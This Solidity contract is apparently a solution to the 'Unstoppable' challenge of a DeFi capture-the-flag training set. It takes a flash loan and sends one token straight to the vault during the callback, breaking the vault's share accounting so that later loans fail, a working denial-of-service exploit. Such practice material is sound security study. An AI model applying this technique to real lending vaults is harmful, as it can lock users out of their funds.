// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Owned} from "solmate/auth/Owned.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
import {UnstoppableVault} from "../../src/unstoppable/UnstoppableVault.sol";
import {IERC20} from "openzeppelin-contracts/contracts/interfaces/IERC20.sol";
import {console} from "forge-std/Test.sol";


contract UnstoppableVaultAttacker is Owned {
    UnstoppableVault vault;
    address s_token;

    constructor(address _vault)Owned(msg.sender){
        vault = UnstoppableVault(_vault);
        s_token = address(vault.asset());
    }


    function attack() external onlyOwner{
        console.log("-------- ATTACK START --------");
        console.log("attacker balance before:", IERC20(s_token).balanceOf(address(this)));
        uint256 amount = IERC20(s_token).balanceOf(address(this)) / 2;
        vault.flashLoan(IERC3156FlashBorrower(address(this)), s_token, amount, "");
        console.log("attacker balance after close loan tokens:", IERC20(s_token).balanceOf(address(this)));
        
    }

    /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        console.log("-------- ENTERING CALLBACK --------");
        console.log("attacker balance after take tokens:", IERC20(s_token).balanceOf(address(this)));
        IERC20(token).transfer(address(vault), 1);
        IERC20(token).approve(address(vault), amount + fee);
        console.log("vault allowance on attacker tokens:", IERC20(s_token).allowance(address(this), address(vault)));
        console.log("attacker balance after repay tokens:", IERC20(s_token).balanceOf(address(this)));
        return keccak256("IERC3156FlashBorrower.onFlashLoan");
        
        //return(true);
    }

}